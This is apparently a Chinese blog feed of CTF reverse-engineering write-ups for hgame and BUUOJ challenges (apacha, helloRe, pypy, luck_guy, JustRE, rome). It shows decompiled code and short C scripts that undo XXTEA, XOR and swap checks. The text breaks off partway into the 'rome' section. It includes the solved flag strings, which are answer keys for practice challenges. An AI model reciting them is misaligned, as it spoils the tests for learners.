        <content type="html"><![CDATA[<h1 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1M0GtstGLe4Gge1fknju5hQ">题目附件</a>提取码：89ri<br>xxtea加密<br><a href="http://www.elecfans.com/emb/danpianji/20110825212016.html">XXTEA加密算法的原理及其C语言实现</a><br>拖入ida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; rax</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+0h] [rbp-48h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [rsp+4h] [rbp-44h]</span><br><span class="line">  int v8; &#x2F;&#x2F; [rsp+8h] [rbp-40h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [rsp+Ch] [rbp-3Ch]</span><br><span class="line">  char v10[40]; &#x2F;&#x2F; [rsp+10h] [rbp-38h]</span><br><span class="line">  unsigned __int64 v11; &#x2F;&#x2F; [rsp+38h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v11 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v6 &#x3D; 1;</span><br><span class="line">  v7 &#x3D; 2;</span><br><span class="line">  v8 &#x3D; 3;</span><br><span class="line">  v9 &#x3D; 4;</span><br><span class="line">  sub_11AA(a1, a2, a3);</span><br><span class="line">  __printf_chk(1LL, &quot;Please input: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%35s&quot;, v10);</span><br><span class="line">  if ( (unsigned int)strlen(v10) !&#x3D; 35 )       &#x2F;&#x2F;验证长度</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;wrong length!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 &#x3D; malloc(0x8CuLL);</span><br><span class="line">  v4 &#x3D; 0LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v3[v4] &#x3D; v10[v4];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 !&#x3D; 35 );</span><br><span class="line">  sub_1447(v3, 35LL, &amp;v6, v10);                &#x2F;&#x2F;xxtea加密</span><br><span class="line">  if ( (unsigned int)sub_1550(v3, 35LL) )      &#x2F;&#x2F;再次验证</span><br><span class="line">    puts(&quot;    :)  Flag is your input.&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;    :(  Try again.&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span><br><span class="line">int btea(int* v, int n, unsigned int k[4])       </span><br><span class="line">&#123;</span><br><span class="line">    unsigned int z&#x3D;v[n-1], y&#x3D;v[0], sum&#x3D;0, e, DELTA&#x3D;0x9e3779b9;</span><br><span class="line">int p, q ;</span><br><span class="line">    if (n &gt; 1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 加密过程 *&#x2F;</span><br><span class="line">        q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        while (q-- &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">    sum +&#x3D; DELTA;</span><br><span class="line">e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">&#123;</span><br><span class="line">y &#x3D; v[p+1];</span><br><span class="line">z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">        return 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">else if (n &lt; -1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 解密过程 *&#x2F;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">sum &#x3D; q*DELTA ;</span><br><span class="line">        while (sum !&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--) </span><br><span class="line">&#123;</span><br><span class="line">z &#x3D; v[p-1];</span><br><span class="line">y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            z &#x3D; v[n-1]; </span><br><span class="line">y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">sum -&#x3D; DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        return 0; </span><br><span class="line">&#125;  </span><br><span class="line">return 1; </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int check[35]&#x3D;&#123;0x0E74EB323,0x0B7A72836,0x59CA6FE2,0x967CC5C1,0x0E7802674,0x3D2D54E6,</span><br><span class="line">0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD,0x0F496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,</span><br><span class="line">0x5270A5C2,0x0AC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0x0FB36DA2D,0x22179645,0x5CE3529D,</span><br><span class="line">0x0D189E1FB,0x0E85BD489,0x73C8D11F,0x54B5C196,0x0B67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,</span><br><span class="line">0x0A7E801FD,0x0C30D6EAB,0x1BADDC9C,0x3453B04A,0x92A406F9&#125;;</span><br><span class="line">int n&#x3D;35;</span><br><span class="line">unsigned int k[4]&#x3D;&#123;1,2,3,4&#125;;</span><br><span class="line">btea(check, -n, k);</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;0;i&lt;35;i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%c&quot;,check[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;上述算法描述中，v表示为运算的长整型数据的首地址，k为长整型的密钥的首地址，n表示要要运算的组元个数，正表示加密，负表示解密。N是以32bit为基本单位的组元个数。</span><br></pre></td></tr></table></figure><blockquote><p>hgame{l00ks_1ike_y0u_f0Und_th3_t34}</p></blockquote><h1 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h1><p><a href="https://pan.baidu.com/s/1t1QacPyctI_WSWYYMA5_FQ">题目附件</a>提取码：ciyc<br>这道题就是异或与比较<br>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char memory[22];</span><br><span class="line">int a&#x3D;0x0FF;</span><br><span class="line">int b[22]&#x3D;&#123;0x97, 0x99, 0x9C, 0x91, 0x9E, 0x81, 0x91, 0x9D, 0x9B, 0x9A, 0x9A, 0xAB, 0x81, 0x97, 0xAE, 0x80, 0x83, 0x8F, 0x94, 0x89, 0x99, 0x97&#125;;</span><br><span class="line">for (int i &#x3D; 0; i &lt; 23; i++)</span><br><span class="line">&#123;</span><br><span class="line">memory[i]&#x3D;b[i]^a;</span><br><span class="line">a--;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;, memory);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&gt;hgame&#123;hello_re_player&#125;</span><br></pre></td></tr></table></figure><h1 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h1><p><a href="https://pan.baidu.com/s/11-_mbvb6tZezucy2DbU7CQ">题目附件</a>提取码：a5mm<br>python字节码，参考文档还原，好像有软件可以直接还原。<br><a href="https://docs.python.org/zh-cn/3.7/library/dis.html">文档链接</a><br>大致意思为：输入flag，去flag第六位至倒数第一位，flag[2i]与flag[2i+1]交换，<br>flag[i]^=i,最后输出的flag为30466633346f59213b4139794520572b45514d61583151576638643a</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">  4           0 LOAD_GLOBAL              0 (input)</span><br><span class="line">              2 LOAD_CONST               1 (&#39;give me your flag:\n&#39;)</span><br><span class="line">              4 CALL_FUNCTION            1</span><br><span class="line">              6 STORE_FAST               0 (raw_flag)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_GLOBAL              1 (list)</span><br><span class="line">             10 LOAD_FAST                0 (raw_flag)</span><br><span class="line">             12 LOAD_CONST               2 (6)</span><br><span class="line">             14 LOAD_CONST               3 (-1)</span><br><span class="line">             16 BUILD_SLICE              2                  </span><br><span class="line">             18 BINARY_SUBSCR</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 STORE_FAST               1 (cipher)              cipher&#x3D;flag[6::-1]</span><br><span class="line"></span><br><span class="line">  6          24 LOAD_GLOBAL              2 (len)</span><br><span class="line">             26 LOAD_FAST                1 (cipher)</span><br><span class="line">             28 CALL_FUNCTION            1</span><br><span class="line">             30 STORE_FAST               2 (length)           length&#x3D;len(cipher)</span><br><span class="line"></span><br><span class="line">  8          32 LOAD_GLOBAL              3 (range)</span><br><span class="line">             34 LOAD_FAST                2 (length)</span><br><span class="line">             36 LOAD_CONST               4 (2)</span><br><span class="line">             38 BINARY_FLOOR_DIVIDE                              range(length&#x2F;2)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 GET_ITER</span><br><span class="line">        &gt;&gt;   44 FOR_ITER                54 (to 100)</span><br><span class="line">             46 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  9          48 LOAD_FAST                1 (cipher)</span><br><span class="line">             50 LOAD_CONST               4 (2)</span><br><span class="line">             52 LOAD_FAST                3 (i)</span><br><span class="line">             54 BINARY_MULTIPLY                                  2i</span><br><span class="line">             56 LOAD_CONST               5 (1)</span><br><span class="line">             58 BINARY_ADD                                       2i+1</span><br><span class="line">             60 BINARY_SUBSCR                                    cipher[2i+1]</span><br><span class="line">             62 LOAD_FAST                1 (cipher)</span><br><span class="line">             64 LOAD_CONST               4 (2)</span><br><span class="line">             66 LOAD_FAST                3 (i)</span><br><span class="line">             68 BINARY_MULTIPLY</span><br><span class="line">             70 BINARY_SUBSCR                                    cipher[2i]</span><br><span class="line">             72 ROT_TWO                                          cipher[2i]与cipher[2i+1]交换</span><br><span class="line">             74 LOAD_FAST                1 (cipher)</span><br><span class="line">             76 LOAD_CONST               4 (2)</span><br><span class="line">             78 LOAD_FAST                3 (i)</span><br><span class="line">             80 BINARY_MULTIPLY</span><br><span class="line">             82 STORE_SUBSCR</span><br><span class="line">             84 LOAD_FAST                1 (cipher)</span><br><span class="line">             86 LOAD_CONST               4 (2)</span><br><span class="line">             88 LOAD_FAST                3 (i)</span><br><span class="line">             90 BINARY_MULTIPLY</span><br><span class="line">             92 LOAD_CONST               5 (1)</span><br><span class="line">             94 BINARY_ADD</span><br><span class="line">             96 STORE_SUBSCR                                     新的cipher</span><br><span class="line">             98 JUMP_ABSOLUTE           44</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;  100 BUILD_LIST               0</span><br><span class="line">            102 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 13         104 LOAD_GLOBAL              3 (range)</span><br><span class="line">            106 LOAD_FAST                2 (length)</span><br><span class="line">            108 CALL_FUNCTION            1</span><br><span class="line">            110 GET_ITER                                         range(length)</span><br><span class="line">        &gt;&gt;  112 FOR_ITER                26 (to 140)</span><br><span class="line">            114 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line"> 14         116 LOAD_FAST                4 (res)</span><br><span class="line">            118 LOAD_METHOD              4 (append)</span><br><span class="line">            120 LOAD_GLOBAL              5 (ord)</span><br><span class="line">            122 LOAD_FAST                1 (cipher)</span><br><span class="line">            124 LOAD_FAST                3 (i)</span><br><span class="line">            126 BINARY_SUBSCR</span><br><span class="line">            128 CALL_FUNCTION            1</span><br><span class="line">            130 LOAD_FAST                3 (i)</span><br><span class="line">            132 BINARY_XOR                                       res&#x3D;ord(cipher[i])^i</span><br><span class="line">            134 CALL_METHOD              1</span><br><span class="line">            136 POP_TOP</span><br><span class="line">            138 JUMP_ABSOLUTE          112</span><br><span class="line"></span><br><span class="line"> 15     &gt;&gt;  140 LOAD_GLOBAL              6 (bytes)</span><br><span class="line">            142 LOAD_FAST                4 (res)</span><br><span class="line">            144 CALL_FUNCTION            1</span><br><span class="line">            146 LOAD_METHOD              7 (hex)</span><br><span class="line">            148 CALL_METHOD              0</span><br><span class="line">            150 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 16         152 LOAD_GLOBAL              8 (print)</span><br><span class="line">            154 LOAD_CONST               6 (&#39;your flag: &#39;)  </span><br><span class="line">            156 LOAD_FAST                4 (res)                 输出res(hex)</span><br><span class="line">            158 BINARY_ADD</span><br><span class="line">            160 CALL_FUNCTION            1</span><br><span class="line">            162 POP_TOP</span><br><span class="line">            164 LOAD_CONST               0 (None)</span><br><span class="line">            166 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int flag[28]&#x3D;&#123;0x30,0x46,0x66,0x33,0x34,0x6f,0x59,0x21,0x3b,0x41,0x39,0x79,0x45,0x20,0x57,0x2b,0x45,0x51,0x4d,0x61,0x58,0x31,0x51,0x57,0x66,0x38,0x64,0x3a&#125;;</span><br><span class="line">int i,a;</span><br><span class="line">for(i&#x3D;0;i&lt;28;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]^&#x3D;i;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;14;i++)</span><br><span class="line">&#123;</span><br><span class="line">a&#x3D;flag[2*i];</span><br><span class="line">flag[2*i]&#x3D;flag[2*i+1];</span><br><span class="line">flag[2*i+1]&#x3D;a;</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;28;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="luck-guy"><a href="#luck-guy" class="headerlink" title="luck_guy"></a>luck_guy</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]luck_guy">题目链接</a><br>查看文件信息，是64位文件，拖进ida里，可以发现get_flag为flag的变换函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 get_flag()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; &#x2F;&#x2F; eax</span><br><span class="line">  char v1; &#x2F;&#x2F; al</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; &#x2F;&#x2F; [rsp+8h] [rbp-38h]</span><br><span class="line">  __int64 s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]</span><br><span class="line">  char v6; &#x2F;&#x2F; [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v0 &#x3D; time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( rand() % 200 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        puts(&quot;OK, it&#39;s flag:&quot;);</span><br><span class="line">        memset(&amp;s, 0, 0x28uLL);</span><br><span class="line">        strcat(&amp;s, f1);</span><br><span class="line">        strcat(&amp;s, &amp;f2);</span><br><span class="line">        printf(&quot;%s&quot;, &amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        printf(&quot;Solar not like you&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        printf(&quot;Solar want a girlfriend&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        v6 &#x3D; 0;</span><br><span class="line">        s &#x3D; 9180147350284624745LL;</span><br><span class="line">        strcat(&amp;f2, &amp;s);</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        for ( j &#x3D; 0; j &lt;&#x3D; 7; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( j % 2 &#x3D;&#x3D; 1 )</span><br><span class="line">            v1 &#x3D; *(&amp;f2 + j) - 2;</span><br><span class="line">          else</span><br><span class="line">            v1 &#x3D; *(&amp;f2 + j) - 1;</span><br><span class="line">          *(&amp;f2 + j) &#x3D; v1;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;emmm,you can&#39;t find flag 23333&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是先运行case 4，然后case 5，最后case 1.<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a[8]&#x3D;&#123;0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f&#125;;</span><br><span class="line">int i,v1;</span><br><span class="line">for(i&#x3D;0;i&lt;8;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ( i % 2 &#x3D;&#x3D; 1 )</span><br><span class="line">            a[i] -&#x3D; 2;</span><br><span class="line">        else</span><br><span class="line">            a[i] -&#x3D; 1;</span><br><span class="line">        printf(&quot;%c&quot;,a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{do_not_hate_me}</p></blockquote><h1 id="JustRE"><a href="#JustRE" class="headerlink" title="JustRE"></a>JustRE</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF2020]JustRE">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span><br><span class="line">&#123;</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+0h] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  if ( a2 !&#x3D; 272 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 !&#x3D; 273 )</span><br><span class="line">      return 0;</span><br><span class="line">    if ( a3 !&#x3D; 1 &amp;&amp; a3 !&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sprintf(&amp;String, aD, ++dword_4099F0);</span><br><span class="line">      if ( dword_4099F0 &#x3D;&#x3D; 19999 )</span><br><span class="line">      &#123;</span><br><span class="line">        sprintf(&amp;String, aBjdDD2069a4579, 19999, 0);</span><br><span class="line">        SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    EndDialog(hWnd, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第14行，我把那两个数直接带进去，就对了。</p><blockquote><p>flag{1999902069a45792d233ac}</p></blockquote><h1 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]rome">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 